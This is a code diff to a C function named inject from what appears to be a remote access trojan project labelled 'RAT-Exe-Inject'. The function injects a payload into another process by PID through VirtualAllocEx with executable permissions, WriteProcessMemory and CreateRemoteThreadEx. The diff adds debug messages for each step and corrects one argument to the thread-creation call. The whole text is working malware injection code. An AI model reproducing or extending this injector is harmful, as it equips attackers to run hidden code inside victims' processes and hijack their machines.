@@ -51,6 +51,8 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 		goto cleanup;
 	}
 
+	OutputDebugStringA("RAT-Exe-Inject::inject - Successfully opened process!\n");
+
 	// allocate memory in target process
 	baseAddress = VirtualAllocEx(hProcess, NULL, payloadSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 	if (baseAddress == NULL)
@@ -61,6 +63,8 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 		goto cleanup;
 	}
 
+	OutputDebugStringA("RAT-Exe-Inject::inject - Successfully allocated memory in target process\n");
+
 	status = WriteProcessMemory(hProcess, baseAddress, payloadBytes, payloadSize, &numBytesWritten);
 	if (status == 0)
 	{
@@ -69,7 +73,9 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 		goto cleanup;
 	}
 
-	hThread = CreateRemoteThreadEx(hProcess, NULL, payloadSize, (LPTHREAD_START_ROUTINE)baseAddress, NULL, NULL, NULL, threadID);
+	OutputDebugStringA("RAT-Exe-Inject::inject - Successfully wrote payload to target process!\n");
+
+	hThread = CreateRemoteThreadEx(hProcess, NULL, payloadSize, (LPTHREAD_START_ROUTINE)baseAddress, NULL, 0, NULL, threadID);
 	if (hThread == NULL)
 	{
 		sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Failed to start remote thread! Error %d\n", GetLastError());
@@ -78,7 +84,13 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 		goto cleanup;
 	}
 
+	OutputDebugStringA("RAT-Exe-Inject::inject - Successfully created thread! Waiting for it to finish...\n");
+
 	WaitForSingleObject(hThread, INFINITE);
+
+	OutputDebugStringA("RAT-Exe-Inject::inject - Thread finished!\n");
+
+	status = ERROR_SUCCESS;
 
 
 cleanup:
